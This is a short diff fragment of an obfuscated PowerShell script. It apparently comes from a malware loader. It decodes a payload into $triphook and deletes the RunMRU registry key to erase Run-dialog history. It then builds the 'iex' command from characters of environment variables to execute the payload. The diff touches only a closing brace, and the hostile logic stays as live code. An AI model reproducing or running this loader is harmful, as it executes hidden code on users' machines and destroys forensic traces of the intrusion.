@@ -14,4 +14,4 @@ $triphook = suresure -sec $mirrage -bty $k
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
-&($env:CommonProgramW6432[12],$env:ComSpec[15],$env:ComSpec[25] -Join $())($triphook) -ErrorAction Stop}
+&($env:CommonProgramW6432[12],$env:ComSpec[15],$env:ComSpec[25] -Join $())($triphook) -ErrorAction Stop
